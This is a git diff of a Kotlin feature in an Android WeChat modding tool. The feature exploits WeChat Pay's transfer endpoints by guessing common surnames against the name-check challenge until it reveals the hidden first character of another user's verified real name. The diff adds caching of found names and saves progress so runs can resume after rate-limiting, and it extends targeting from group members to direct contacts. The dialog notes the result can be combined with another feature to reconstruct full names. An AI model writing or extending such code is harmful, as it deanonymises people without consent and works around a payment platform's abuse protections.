@@ -26,9 +26,12 @@ import dev.ujhhgtg.wekit.features.api.net.WePacketHelper
 import dev.ujhhgtg.wekit.features.api.net.models.protobuf.BeforeTransferProto
 import dev.ujhhgtg.wekit.features.api.net.models.protobuf.BeforeTransferReqProto
 import dev.ujhhgtg.wekit.features.api.ui.WeContactPrefsScreenApi
-import dev.ujhhgtg.wekit.features.api.ui.WeCurrentConversationApi
 import dev.ujhhgtg.wekit.features.core.Feature
 import dev.ujhhgtg.wekit.features.core.SwitchFeature
+import dev.ujhhgtg.wekit.features.items.chat.BruteForceGroupMemberRealNamesFirstChar.RETCODE_WRONG_NAME
+import dev.ujhhgtg.wekit.features.items.chat.BruteForceGroupMemberRealNamesFirstChar.classNetSceneTenpayRemittanceGen
+import dev.ujhhgtg.wekit.features.items.chat.BruteForceGroupMemberRealNamesFirstChar.onEnable
+import dev.ujhhgtg.wekit.features.items.chat.BruteForceGroupMemberRealNamesFirstChar.pendingPlaceOrders
 import dev.ujhhgtg.wekit.ui.content.AlertDialogContent
 import dev.ujhhgtg.wekit.ui.content.Button
 import dev.ujhhgtg.wekit.ui.content.DefaultColumn
@@ -37,7 +40,7 @@ import dev.ujhhgtg.wekit.ui.utils.ShowComposeDialogScope
 import dev.ujhhgtg.wekit.ui.utils.showComposeDialog
 import dev.ujhhgtg.wekit.utils.WeLogger
 import dev.ujhhgtg.wekit.utils.android.currentWxId
-import dev.ujhhgtg.wekit.utils.android.showToastSuspend
+import dev.ujhhgtg.wekit.utils.fs.KnownPaths
 import dev.ujhhgtg.wekit.utils.strings.isGroupChatWxId
 import kotlinx.coroutines.CompletableDeferred
 import kotlinx.coroutines.CoroutineScope
@@ -47,9 +50,14 @@ import kotlinx.coroutines.launch
 import kotlinx.coroutines.suspendCancellableCoroutine
 import kotlinx.coroutines.withTimeoutOrNull
 import kotlinx.serialization.ExperimentalSerializationApi
+import kotlinx.serialization.json.Json
 import org.json.JSONObject
 import java.util.concurrent.ConcurrentHashMap
 import kotlin.coroutines.resume
+import kotlin.io.path.div
+import kotlin.io.path.exists
+import kotlin.io.path.readText
+import kotlin.io.path.writeText
 import kotlin.time.Duration.Companion.seconds
 
 @OptIn(ExperimentalSerializationApi::class)
@@ -86,7 +94,73 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(), IResolveDex,
      */
     private val pendingPlaceOrders = ConcurrentHashMap<Any, CompletableDeferred<JSONObject?>>()
 
+    // ── Result cache ──────────────────────────────────────────────────────────
+
+    private val cacheFile by lazy { KnownPaths.moduleData / "real_names_first_char.json" }
+
+    /**
+     * wxId → confirmed real-name first char. Only hits are stored.
+     * Exposed so [DisplayGroupMemberRealName] can read it for combined display.
+     */
+    val realNames = ConcurrentHashMap<String, String>()
+
+    private fun loadCache() {
+        runCatching {
+            val file = cacheFile
+            if (!file.exists()) return
+            val map = Json.decodeFromString<Map<String, String>>(file.readText())
+            realNames.putAll(map)
+            WeLogger.d(TAG, "loaded ${map.size} cached first chars")
+        }.onFailure { WeLogger.w(TAG, "failed to load $cacheFile", it) }
+    }
+
+    private fun saveCache() {
+        runCatching {
+            cacheFile.writeText(Json.encodeToString(realNames.toMap()))
+        }.onFailure { WeLogger.w(TAG, "failed to save $cacheFile", it) }
+    }
+
+    // ── Progress persistence (pause / resume) ─────────────────────────────────
+
+    /**
+     * Persists the index into [COMMON_SURNAMES] at which the next attempt should resume after
+     * a rate-limit pause. Format: `Map<wxId, resumeIndex>`.
+     *
+     * Entries are written when a rate-limit retcode is encountered, and cleared on a confirmed
+     * hit, manual cancellation, or loop exhaustion so stale progress never blocks a fresh run.
+     */
+    private val progressFile by lazy { KnownPaths.moduleData / "real_names_first_char_progress.json" }
+    private val savedProgress = ConcurrentHashMap<String, Int>()
+
+    private fun loadProgress() {
+        runCatching {
+            if (!progressFile.exists()) return
+            val map = Json.decodeFromString<Map<String, Int>>(progressFile.readText())
+            savedProgress.putAll(map)
+            WeLogger.d(TAG, "loaded progress for ${map.size} members")
+        }.onFailure { WeLogger.w(TAG, "failed to load $progressFile", it) }
+    }
+
+    private fun saveProgress(memberId: String, resumeIndex: Int) {
+        runCatching {
+            savedProgress[memberId] = resumeIndex
+            progressFile.writeText(Json.encodeToString(savedProgress.toMap()))
+        }.onFailure { WeLogger.w(TAG, "failed to save progress for $memberId", it) }
+    }
+
+    private fun clearProgress(memberId: String) {
+        if (savedProgress.remove(memberId) != null) {
+            runCatching {
+                progressFile.writeText(Json.encodeToString(savedProgress.toMap()))
+            }.onFailure { WeLogger.w(TAG, "failed to clear progress for $memberId", it) }
+        }
+    }
+
+    // ── Lifecycle ─────────────────────────────────────────────────────────────
+
     override fun onEnable() {
+        loadCache()
+        loadProgress()
         WeContactPrefsScreenApi.addProvider(this)
 
         // void onGYNetEnd(int errType, String errMsg, JSONObject resp)
@@ -112,13 +186,12 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(), IResolveDex,
     override fun getContactInfoItem(activity: Activity): List<WeContactPrefsScreenApi.PreferenceItem> {
         val memberId = activity.currentWxId ?: return emptyList()
         if (memberId.isGroupChatWxId) return emptyList()
-        if (!WeCurrentConversationApi.value.isGroupChatWxId) return emptyList()
 
         return listOf(
             WeContactPrefsScreenApi.PreferenceItem(
                 key = PREF_KEY,
                 title = "爆破群成员实名首字",
-                summary = "尝试实名首字",
+                summary = realNames[memberId]?.let { "首字: $it" } ?: "点击爆破",
                 position = 1
             )
         )
@@ -128,8 +201,11 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(), IResolveDex,
         if (key != PREF_KEY) return false
 
         val memberId = activity.currentWxId ?: return true
-        val groupId = WeCurrentConversationApi.value
-        if (!groupId.isGroupChatWxId) return true
+        // Non-null only when the profile was opened from inside a group chat.
+        // Null means a direct friend lookup — beforetransfer and transferplaceorder
+        // both handle this case with groupId omitted.
+        val groupId = activity.intent.getStringExtra("Contact_ChatRoomId")
+            ?.takeIf { it.isNotEmpty() }
 
         showComposeDialog(activity) { ExploitDialog(memberId, groupId) }
         return true
@@ -145,7 +221,7 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(), IResolveDex,
      */
     private data class TransferContext(
         val memberId: String,
-        val groupId: String,
+        val groupId: String?,
         val maskedRealName: String,
         val truenameExtend: String,
         val nickname: String,
@@ -154,7 +230,7 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(), IResolveDex,
     )
 
     /** Step 1: `/cgi-bin/mmpay-bin/beforetransfer` → masked real name + truename_extend key. */
-    private suspend fun fetchBeforeTransfer(memberId: String, groupId: String): BeforeTransferProto? =
+    private suspend fun fetchBeforeTransfer(memberId: String, groupId: String?): BeforeTransferProto? =
         suspendCancellableCoroutine { cont ->
             val reqBytes = BeforeTransferReqProto(userName = memberId, groupId = groupId).encode()
             WePacketHelper.sendCgiRaw("/cgi-bin/mmpay-bin/beforetransfer", 2783, 0, 0, reqBytes) {
@@ -197,7 +273,7 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(), IResolveDex,
                 ctx.amountYuan, "1", ctx.memberId, ctx.maskedRealName, 31, 2, "", 0, null, null,
                 "", null, null, 14, "", "", null, ctx.nickname, ctx.maskedRealName, null,
                 inputName, checknameSign, ctx.truenameExtend, ctx.placeorderReserves,
-                0, "", 0, ctx.groupId, "", false
+                0, "", 0, ctx.groupId ?: "", "", false
             )
         } catch (e: Throwable) {
             WeLogger.e(TAG, "failed to construct transferplaceorder scene", e)
@@ -219,7 +295,7 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(), IResolveDex,
         }
     }
 
-    // ── Brute-force orchestration ───────────────────────────────────────────────
+    // ── Brute-force orchestration ─────────────────────────────────────────────
 
     private sealed interface RunResult {
         /** Found the first char (and, if the challenge only asked for it, the whole revealed name). */
@@ -231,11 +307,19 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(), IResolveDex,
 
         /** User aborted mid-run; carries how far we got. */
         data class Aborted(val tried: Int) : RunResult
+
+        /**
+         * Rate-limit retcode received. Progress was saved to disk; the next attempt will
+         * resume from [resumeIndex] in [COMMON_SURNAMES].
+         */
+        data class Paused(val tried: Int, val resumeIndex: Int) : RunResult
     }
 
     private class RunState(
         val tried: MutableIntState,
         val total: Int,
+        /** Absolute start index into [COMMON_SURNAMES] for this run (0 for fresh, >0 for resume). */
+        val startIndex: Int = 0,
         @Volatile var cancelled: Boolean = false
     )
 
@@ -243,12 +327,13 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(), IResolveDex,
      * Full pipeline: beforetransfer → probe placeorder (to get the checkname challenge) → try each
      * surname as `input_name`, reusing the challenge's `checkname_sign`, until one is accepted.
      *
-     * A wrong guess comes back with retcode [RETCODE_WRONG_NAME]; anything else non-empty is treated
-     * as the accepted name (retcode "0") or an unexpected error that aborts the run.
+     * The loop starts at [RunState.startIndex] so that a paused run can resume from where it left
+     * off. On a confirmed rate-limit retcode (unexpected, not [RETCODE_WRONG_NAME]), progress is
+     * saved and [RunResult.Paused] is returned so the user can restart cleanly later.
      */
     private suspend fun runBruteForce(
         memberId: String,
-        groupId: String,
+        groupId: String?,
         amountYuan: Double,
         state: RunState
     ): RunResult {
@@ -279,6 +364,7 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(), IResolveDex,
 
         val needCheckName = probe.optInt("need_checkname", 0)
         if (needCheckName != 1) {
+            clearProgress(memberId)
             return RunResult.NoCheckNeeded
         }
 
@@ -289,17 +375,21 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(), IResolveDex,
         if (checknameSign.isNullOrEmpty()) {
             return RunResult.Failed("响应缺少 checkname_sign")
         }
-        WeLogger.i(TAG, "challenge: display_name='$displayName', sign=$checknameSign")
+        WeLogger.i(TAG, "challenge: display_name='$displayName', sign=$checknameSign (startIndex=${state.startIndex})")
 
-        for ((index, candidate) in COMMON_SURNAMES.withIndex()) {
-            if (state.cancelled) return RunResult.Aborted(index)
+        // Resume from saved index so rate-limited runs don't retry already-eliminated candidates
+        for ((index, candidate) in COMMON_SURNAMES.withIndex().drop(state.startIndex)) {
+            if (state.cancelled) {
+                clearProgress(memberId)
+                return RunResult.Aborted(index - state.startIndex)
+            }
 
             val resp = sendPlaceOrder(ctx, inputName = candidate, checknameSign = checknameSign)
-            state.tried.intValue = index + 1
+            state.tried.intValue = index - state.startIndex + 1
 
             if (resp == null) {
                 WeLogger.w(TAG, "guess '$candidate' timed out, continuing")
-                delay(3.seconds)
+                delay(2.seconds)
                 continue
             }
 
@@ -308,27 +398,32 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(), IResolveDex,
 
             when {
                 retcode == RETCODE_WRONG_NAME -> {
-                    // wrong first char, keep going (rate-limit friendly)
-                    delay(5.seconds)
+                    // Wrong first char — keep going (rate-limit friendly delay)
+                    delay(2.seconds)
                 }
 
                 retcode.isNullOrEmpty() || retcode == "0" -> {
+                    realNames[memberId] = candidate
+                    saveCache()
+                    clearProgress(memberId)
                     return RunResult.Found(candidate, displayName)
                 }
 
                 else -> {
-                    // Unexpected retcode: sign may have expired or risk control kicked in
-//                    return RunResult.Failed("意外的 retcode=$retcode (可能触发风控或 sign 失效)")
-                    showToastSuspend("警告: 意外的 retcode=$retcode (可能触发风控或 sign 失效)!")
-                    delay(5.seconds)
+                    // Unexpected retcode: risk control kicked in. Save progress so the user
+                    // can resume from this exact candidate after the cooldown period.
+                    WeLogger.w(TAG, "rate-limit retcode=$retcode at index=$index ('$candidate'), saving progress")
+                    saveProgress(memberId, index)
+                    return RunResult.Paused(tried = index - state.startIndex + 1, resumeIndex = index)
                 }
             }
         }
 
+        clearProgress(memberId)
         return RunResult.Failed("已尝试全部 ${COMMON_SURNAMES.size} 个常见姓氏, 未命中")
     }
 
-    // ── Dialog ──────────────────────────────────────────────────────────────────
+    // ── Dialog ────────────────────────────────────────────────────────────────
 
     private sealed interface Phase {
         data object Idle : Phase
@@ -339,10 +434,16 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(), IResolveDex,
     @Composable
     private fun ShowComposeDialogScope.ExploitDialog(
         memberId: String,
-        groupId: String
+        groupId: String?
     ) {
         var phase by remember { mutableStateOf<Phase>(Phase.Idle) }
         var amountInput by remember { mutableStateOf("100000") }
+
+        // Read saved progress once at composition time; stable for the dialog lifetime
+        val resumeIndex = remember { savedProgress[memberId] }
+        val remaining = remember(resumeIndex) {
+            if (resumeIndex != null) COMMON_SURNAMES.size - resumeIndex else COMMON_SURNAMES.size
+        }
 
         LaunchedEffect(phase) {
             val current = phase
@@ -370,6 +471,12 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(), IResolveDex,
                                     "逐一尝试实名首字. 可能触发微信风控, 风险自负.\n\n" +
                                     "金额需足够大以触发姓名校验 (默认 10 万元). 与「显示群成员实名尾字」配合可拼出姓名."
                             )
+                            if (resumeIndex != null) {
+                                Text(
+                                    "检测到上次因风控暂停的进度 (已尝试 ${COMMON_SURNAMES.size - remaining}/${COMMON_SURNAMES.size}, " +
+                                        "将从「${COMMON_SURNAMES[resumeIndex]}」继续). 点击「继续」恢复上次进度, 或点击「重新开始」从头开始."
+                                )
+                            }
                             TextField(
                                 value = amountInput,
                                 onValueChange = { amountInput = it.filter { c -> c.isDigit() }.take(7) },
@@ -395,17 +502,33 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(), IResolveDex,
                                 Text("失败: ${r.reason}")
                             is RunResult.Aborted ->
                                 Text("已终止 (尝试了 ${r.tried} 个)")
+                            is RunResult.Paused ->
+                                Text(
+                                    "已暂停 (触发风控, 尝试了 ${r.tried} 个). " +
+                                        "进度已保存, 下次打开将从「${COMMON_SURNAMES[r.resumeIndex]}」继续."
+                                )
                         }
                     }
                 }
             },
             confirmButton = {
                 when (phase) {
-                    is Phase.Idle -> Button(onClick = {
-                        phase = Phase.Running(
-                            RunState(mutableIntStateOf(0), COMMON_SURNAMES.size)
-                        )
-                    }) { Text("开始") }
+                    is Phase.Idle -> {
+                        if (resumeIndex != null) {
+                            // Two buttons when there is saved progress: resume (primary) and restart
+                            Button(onClick = {
+                                phase = Phase.Running(
+                                    RunState(mutableIntStateOf(0), remaining, startIndex = resumeIndex)
+                                )
+                            }) { Text("继续 (${COMMON_SURNAMES.size - remaining + 1}/${COMMON_SURNAMES.size})") }
+                        } else {
+                            Button(onClick = {
+                                phase = Phase.Running(
+                                    RunState(mutableIntStateOf(0), COMMON_SURNAMES.size)
+                                )
+                            }) { Text("开始") }
+                        }
+                    }
 
                     is Phase.Done -> Button(onDismiss) { Text("关闭") }
                     else -> {}
@@ -413,7 +536,19 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(), IResolveDex,
             },
             dismissButton = {
                 when (val current = phase) {
-                    is Phase.Idle -> TextButton(onDismiss) { Text("取消") }
+                    is Phase.Idle -> {
+                        if (resumeIndex != null) {
+                            // "重新开始" clears saved progress and runs from index 0
+                            TextButton(onClick = {
+                                clearProgress(memberId)
+                                phase = Phase.Running(
+                                    RunState(mutableIntStateOf(0), COMMON_SURNAMES.size)
+                                )
+                            }) { Text("重新开始") }
+                        } else {
+                            TextButton(onDismiss) { Text("取消") }
+                        }
+                    }
                     is Phase.Running -> TextButton(onClick = { current.state.cancelled = true }) { Text("终止") }
                     is Phase.Done -> {}
                 }
@@ -421,5 +556,3 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(), IResolveDex,
         )
     }
 }
-
-
